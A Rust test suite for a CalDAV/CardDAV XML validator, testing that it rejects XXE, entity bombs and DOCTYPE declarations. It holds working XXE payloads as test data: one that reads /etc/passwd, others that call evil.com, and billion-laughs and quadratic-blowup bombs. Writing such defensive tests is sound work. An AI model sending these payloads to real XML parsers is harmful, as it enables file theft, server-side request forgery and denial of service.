//! E10-02 -- Audit XXE CalDAV/CardDAV.
//!
//! Verifie que le validateur XML rejette toutes les formes
//! d'attaques XXE (XML External Entity), bombes XML, et
//! declarations DOCTYPE malveillantes.

use miyucloud_dav::common::xml_security::validate_xml;

// ════════════════════════════════════════════════════════════════════════════
// XXE classique: entites externes
// ════════════════════════════════════════════════════════════════════════════

#[test]
fn rejects_xxe_file_read() {
    let xml = br#"<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"#;
    assert!(validate_xml(xml).is_err());
}

#[test]
fn rejects_xxe_http_ssrf() {
    let xml = br#"<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://evil.com/steal">
]>
<root>&xxe;</root>"#;
    assert!(validate_xml(xml).is_err());
}

#[test]
fn rejects_parameter_entity_xxe() {
    let xml = br#"<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % pe SYSTEM "http://evil.com/evil.dtd">
  %pe;
]>
<root/>"#;
    assert!(validate_xml(xml).is_err());
}

// ════════════════════════════════════════════════════════════════════════════
// Bombes XML (Billion Laughs / entity expansion)
// ════════════════════════════════════════════════════════════════════════════

#[test]
fn rejects_billion_laughs() {
    let xml = br#"<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>"#;
    assert!(validate_xml(xml).is_err());
}

#[test]
fn rejects_quadratic_blowup() {
    let xml = br#"<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
]>
<root>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</root>"#;
    assert!(validate_xml(xml).is_err());
}

// ════════════════════════════════════════════════════════════════════════════
// DOCTYPE simple (sans entites mais toujours interdit)
// ════════════════════════════════════════════════════════════════════════════

#[test]
fn rejects_empty_doctype() {
    let xml = br#"<?xml version="1.0"?><!DOCTYPE root><root/>"#;
    assert!(validate_xml(xml).is_err());
}

#[test]
fn rejects_doctype_with_internal_subset() {
    let xml = br#"<?xml version="1.0"?>
<!DOCTYPE root [
  <!ELEMENT root (#PCDATA)>
]>
<root>Hello</root>"#;
    assert!(validate_xml(xml).is_err());
}

// ════════════════════════════════════════════════════════════════════════════
// Limites de profondeur et de taille
// ════════════════════════════════════════════════════════════════════════════

#[test]
fn rejects_deeply_nested_xml() {
    let mut xml = String::new();
    for _ in 0..100 {
        xml.push_str("<a>");
    }
    for _ in 0..100 {
        xml.push_str("</a>");
    }
    assert!(validate_xml(xml.as_bytes()).is_err());
}

#[test]
fn rejects_oversized_xml() {
    // 2 MB of content
    let mut xml = String::from("<root>");
    xml.push_str(&"A".repeat(2_000_000));
    xml.push_str("</root>");
    assert!(validate_xml(xml.as_bytes()).is_err());
}

// ════════════════════════════════════════════════════════════════════════════
// XML valide (controle negatif)
// ════════════════════════════════════════════════════════════════════════════

#[test]
fn accepts_valid_propfind_xml() {
    let xml = br#"<?xml version="1.0" encoding="utf-8"?>
<D:propfind xmlns:D="DAV:">
  <D:prop>
    <D:displayname/>
    <D:getcontenttype/>
    <D:getcontentlength/>
    <D:getlastmodified/>
  </D:prop>
</D:propfind>"#;
    assert!(validate_xml(xml).is_ok());
}

#[test]
fn accepts_valid_caldav_report_xml() {
    let xml = br#"<?xml version="1.0" encoding="utf-8"?>
<C:calendar-multiget xmlns:D="DAV:" xmlns:C="urn:ietf:params:xml:ns:caldav">
  <D:prop>
    <D:getetag/>
    <C:calendar-data/>
  </D:prop>
  <D:href>/caldav/owner/cal/event1.ics</D:href>
  <D:href>/caldav/owner/cal/event2.ics</D:href>
</C:calendar-multiget>"#;
    assert!(validate_xml(xml).is_ok());
}
